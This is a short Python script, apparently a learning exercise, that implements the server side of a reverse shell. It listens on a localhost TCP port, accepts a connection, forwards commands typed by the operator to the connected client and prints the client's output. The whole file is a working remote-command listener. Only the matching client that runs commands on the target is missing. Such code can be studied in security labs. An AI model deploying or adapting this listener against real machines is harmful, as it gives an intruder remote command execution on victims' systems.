import socket
import struct
import sys
import os
import subprocess
# server
# run the server with `python reverseShellServer.py` before the client side
HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 53292        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(10)
    print(s)
    #accept a connection once received
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        print(conn)
        data = str(conn.recv(1024), "utf-8")
        print(data)
        while True:
            
            print("write command line instruction here: ")
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        conn.close()
            #conn.sendall(data)
